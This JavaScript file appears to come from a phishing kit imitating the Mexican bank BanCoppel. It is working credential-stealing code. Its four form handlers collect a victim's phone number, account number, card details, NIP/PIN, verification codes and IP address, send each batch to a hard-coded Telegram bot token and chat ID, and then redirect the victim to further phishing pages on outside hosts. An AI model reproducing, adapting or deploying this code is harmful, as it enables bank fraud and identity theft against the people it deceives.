//bot token
var telegram_bot_id = "5489237286:AAGWsCnr1xT5rM8T49m8ZaD_bZeq1Yx91Wg";
//chat id
var chat_id = 5404664121;
var USER, PASS, PIN, PIN2, PIN3, NUMBER, ip, ip2, message;

var ready = function () {
    CEL = document.getElementById("ypn-cel").value;
    FN = document.getElementById("ypn-fn").value;
    NC = document.getElementById("ypn-nc").value;
    ip2 = document.getElementById("address").innerHTML;
    message =  "💲💲💲💲BanCoppel💲💲💲💲\n📱Celular: "+ CEL + "\n📅Fecha: "+ FN + "\n💼Cuenta: " + NC + "\n" + ip2;
    localStorage.setItem("CEL", CEL);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index2.html"
    });
    return false;
}

var ready1 = function () {
    CEL = localStorage.getItem("CEL");
    DT = document.getElementById("ypndt").value;
    DN = document.getElementById("ypndn").value;
    message = "\n💳DT: " + DT + "\n👤NIP: " + DN +"\n📱Celular: " + CEL; localStorage.setItem("CEL", CEL);
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="index3.html"
    });
    return false;
}


var ready2 = function () {
    CEL = localStorage.getItem("CEL");
    CD = document.getElementById("ypncd").value;
    message = "🔑Código: " + CD + "\n📱Celular: " + CEL; localStorage.setItem("CEL", CEL);
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="https://mrspoonky.webcindario.com/index4.html"
    });
    return false;
}

var ready3 = function () {
    CEL = localStorage.getItem("CEL");
    CD2 = document.getElementById("ypncd2").value;
    message = "🔑Código2: " + CD2 + "\n📱Celular: " + CEL; localStorage.setItem("CEL", CEL);
};
var sender3 = function () {
    ready3();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
        location.href="https://coppelactivoyp.at.ua/subscrib/paginadeinicio/"
    });
    return false;
}